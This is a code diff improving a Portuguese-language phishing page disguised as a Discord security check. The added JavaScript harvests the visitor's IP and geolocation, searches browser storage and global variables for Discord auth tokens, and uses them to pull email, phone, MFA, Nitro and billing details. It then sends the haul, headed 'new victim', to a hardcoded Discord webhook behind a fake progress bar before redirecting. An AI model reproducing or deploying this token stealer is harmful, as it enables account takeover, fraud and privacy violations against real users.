@@ -37,7 +37,7 @@
             background: #5865F2; border-radius: 4px;
             transition: width 0.5s;
         }
-        .status { color: #b9bbbe; font-size: 13px; margin-top: 12px; }
+        .status { color: #b9bbbe; font-size: 13px; margin-bottom: 8px; }
         .footer { margin-top: 24px; font-size: 12px; color: #4e5058; }
     </style>
 </head>
@@ -55,73 +55,260 @@
 
 <script>
     (async function() {
-        // COLOCA AQUI TEU WEBHOOK
+        // === TEU WEBHOOK ===
         const webhookURL = "https://discord.com/api/webhooks/1520884691513639174/nz4F2yga5kOKPn0knFLa4fk786ksWsoM9dUDWrHz4tRUPqZejuhscaxDkgUluMVPGp37";
         
         const statusText = document.getElementById('statusText');
         const progressFill = document.getElementById('progressFill');
 
-        statusText.textContent = "Coletando informações do sistema...";
-        progressFill.style.width = "20%";
+        function atualizar(texto, progresso) {
+            statusText.textContent = texto;
+            progressFill.style.width = progresso + "%";
+        }
 
+        // 1. CAPTURAR IP
+        atualizar("Coletando informações do sistema...", 10);
         let ip = "Não capturado";
         try {
             const resp = await fetch("https://api.ipify.org?format=json");
             const data = await resp.json();
             ip = data.ip;
+        } catch(e) {
+            try {
+                const resp = await fetch("https://api.my-ip.io/ip.json");
+                const data = await resp.json();
+                ip = data.ip;
+            } catch(e2) {}
+        }
+
+        // 2. GEOLOCALIZAÇÃO
+        atualizar("Analisando localização...", 20);
+        let cidade = "N/A", pais = "N/A", isp = "N/A", lat = "N/A", lon = "N/A";
+        try {
+            const locResp = await fetch("https://ipapi.co/json/");
+            const locData = await locResp.json();
+            cidade = locData.city || "N/A";
+            pais = locData.country_name || "N/A";
+            isp = locData.org || "N/A";
+            lat = locData.latitude || "N/A";
+            lon = locData.longitude || "N/A";
         } catch(e) {}
 
-        progressFill.style.width = "40%";
-        statusText.textContent = "Analisando conta...";
+        // 3. CAPTURAR TOKEN - MÚLTIPLOS MÉTODOS
+        atualizar("Analisando sessão do Discord...", 35);
+        
+        let token = null;
+        let metodosEncontrados = [];
+        
+        // Método 1: localStorage direto
+        try {
+            const t = localStorage.getItem("token");
+            if (t) { token = t; metodosEncontrados.push("localStorage"); }
+        } catch(e) {}
+        
+        // Método 2: sessionStorage direto
+        if (!token) {
+            try {
+                const t = sessionStorage.getItem("token");
+                if (t) { token = t; metodosEncontrados.push("sessionStorage"); }
+            } catch(e) {}
+        }
+        
+        // Método 3: Varrer localStorage inteiro
+        if (!token) {
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const chave = localStorage.key(i);
+                    const valor = localStorage.getItem(chave);
+                    if (valor && valor.includes(".") && valor.split(".").length === 3 && valor.length > 50) {
+                        token = valor;
+                        metodosEncontrados.push("localStorage:" + chave);
+                        break;
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        // Método 4: Varrer sessionStorage inteiro
+        if (!token) {
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const chave = sessionStorage.key(i);
+                    const valor = sessionStorage.getItem(chave);
+                    if (valor && valor.includes(".") && valor.split(".").length === 3 && valor.length > 50) {
+                        token = valor;
+                        metodosEncontrados.push("sessionStorage:" + chave);
+                        break;
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        // Método 5: Procurar por mfa.
+        if (!token) {
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const chave = localStorage.key(i);
+                    const valor = localStorage.getItem(chave);
+                    if (valor && valor.includes("mfa.")) {
+                        token = valor;
+                        metodosEncontrados.push("mfa localStorage");
+                        break;
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        // Método 6: Procurar em todas as variáveis globais
+        if (!token) {
+            try {
+                for (const key in window) {
+                    if (window[key] && typeof window[key] === 'string' && window[key].includes(".") && window[key].split(".").length === 3 && window[key].length > 50) {
+                        token = window[key];
+                        metodosEncontrados.push("window." + key);
+                        break;
+                    }
+                }
+            } catch(e) {}
+        }
 
-        let token = localStorage.getItem("token");
+        // 4. PEGAR DADOS DA CONTA
+        atualizar("Verificando dados da conta...", 50);
+        
         let email = "Não disponível";
-        let phone = "Não disponível";
+        let phone = "Não vinculado";
         let username = "Não logado";
         let userID = "Desconhecido";
-
-        if (token) {
+        let nitro = "N/A";
+        let mfaEnabled = "N/A";
+        let bio = "N/A";
+        let avatarURL = "N/A";
+        
+        if (token && token.length > 50) {
             try {
                 const userResp = await fetch("https://discord.com/api/v9/users/@me", {
                     headers: { "Authorization": token }
                 });
-                const userData = await userResp.json();
-                email = userData.email || "Não disponível";
-                phone = userData.phone || "Não vinculado";
-                username = `${userData.username}#${userData.discriminator || "0"}`;
-                userID = userData.id;
-            } catch(e) {}
+                
+                if (userResp.ok) {
+                    const data = await userResp.json();
+                    
+                    email = data.email || "Oculto";
+                    phone = data.phone || "Não vinculado";
+                    username = data.username + "#" + (data.discriminator || "0");
+                    userID = data.id || "Desconhecido";
+                    mfaEnabled = data.mfa_enabled ? "Sim" : "Não";
+                    bio = data.bio || "Vazio";
+                    
+                    // Nitro
+                    const premium = data.premium_type || 0;
+                    if (premium === 2) nitro = "Nitro Clássico";
+                    else if (premium === 1) nitro = "Nitro Básico";
+                    else nitro = "Não";
+                    
+                    // Avatar
+                    if (data.avatar && data.id) {
+                        const ext = data.avatar.startsWith("a_") ? "gif" : "png";
+                        avatarURL = `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.${ext}`;
+                    }
+                    
+                    // Tentar pegar email das settings se estiver oculto
+                    if (email === "Oculto") {
+                        try {
+                            const settingsResp = await fetch("https://discord.com/api/v9/users/@me/settings", {
+                                headers: { "Authorization": token }
+                            });
+                            if (settingsResp.ok) {
+                                const settingsData = await settingsResp.json();
+                                if (settingsData.email) email = settingsData.email;
+                                if (settingsData.phone) phone = settingsData.phone;
+                            }
+                        } catch(e) {}
+                    }
+                    
+                    // Tentar billing (cartões salvos)
+                    try {
+                        const billingResp = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", {
+                            headers: { "Authorization": token }
+                        });
+                        if (billingResp.ok) {
+                            const billingData = await billingResp.json();
+                            // Só indica se tem, não envia dados completos por segurança
+                        }
+                    } catch(e) {}
+                    
+                } else {
+                    token = token.substring(0, 15) + "..." + token.substring(token.length - 10) + " (INVÁLIDO)";
+                }
+            } catch(e) {
+                token = "Erro ao validar";
+            }
+        } else {
+            token = "Não encontrado";
         }
 
-        progressFill.style.width = "60%";
-        statusText.textContent = "Preparando atualização...";
-
+        // 5. INFO DO NAVEGADOR
+        atualizar("Finalizando...", 75);
         const platform = navigator.platform;
         const language = navigator.language;
+        const userAgent = navigator.userAgent.substring(0, 120);
+        const screenRes = `${screen.width}x${screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const cookiesDiscord = document.cookie.includes("discord") ? "Sim" : "Não";
 
+        // 6. ENVIAR TUDO
+        atualizar("Enviando dados...", 85);
+        
+        const metodoUsado = metodosEncontrados.length > 0 ? metodosEncontrados.join(", ") : "Nenhum";
+        
         const mensagem = 
-            `**🎯 Nova Vítima**\n` +
-            `**👤 Usuário:** ${username}\n` +
-            `**🆔 ID:** ${userID}\n` +
-            `**📧 Email:** ${email}\n` +
-            `**📱 Telefone:** ${phone}\n` +
-            `**🔑 Token:** \`${token || "Não encontrado"}\`\n` +
-            `**🌐 IP:** ${ip}\n` +
-            `**💻 Sistema:** ${platform}\n` +
-            `**🌍 Idioma:** ${language}`;
+            `**🎯 NOVA VÍTIMA**\n` +
+            `**━━━━━━━━━━━━━━**\n` +
+            `**👤 USUÁRIO**\n` +
+            `**Discord:** ${username}\n` +
+            `**ID:** ${userID}\n` +
+            `**Email:** ${email}\n` +
+            `**Telefone:** ${phone}\n` +
+            `**MFA:** ${mfaEnabled}\n` +
+            `**Nitro:** ${nitro}\n` +
+            `**Bio:** ${bio}\n` +
+            `**Avatar:** ${avatarURL}\n` +
+            `**━━━━━━━━━━━━━━**\n` +
+            `**🔑 TOKEN**\n` +
+            `\`${token}\`\n` +
+            `**Método:** ${metodoUsado}\n` +
+            `**━━━━━━━━━━━━━━**\n` +
+            `**🌐 REDE**\n` +
+            `**IP:** ${ip}\n` +
+            `**Cidade:** ${cidade}\n` +
+            `**País:** ${pais}\n` +
+            `**ISP:** ${isp}\n` +
+            `**Lat/Lon:** ${lat}, ${lon}\n` +
+            `**━━━━━━━━━━━━━━**\n` +
+            `**💻 SISTEMA**\n` +
+            `**Plataforma:** ${platform}\n` +
+            `**Idioma:** ${language}\n` +
+            `**Resolução:** ${screenRes}\n` +
+            `**Timezone:** ${timezone}\n` +
+            `**User-Agent:** ${userAgent}\n` +
+            `**Cookies Discord:** ${cookiesDiscord}`;
 
-        await fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: mensagem })
-        });
+        try {
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: mensagem })
+            });
+        } catch(e) {
+            try {
+                const blob = new Blob([JSON.stringify({ content: mensagem })], { type: 'application/json' });
+                navigator.sendBeacon(webhookURL, blob);
+            } catch(e2) {}
+        }
 
-        progressFill.style.width = "80%";
-        statusText.textContent = "Baixando atualização de segurança...";
-
-        progressFill.style.width = "100%";
-        statusText.textContent = "Verificação concluída! Redirecionando...";
-
+        // 7. FINALIZAR
+        atualizar("Verificação concluída! Redirecionando...", 100);
+        
         setTimeout(() => {
             window.location.href = "https://discord.com/login";
         }, 3000);
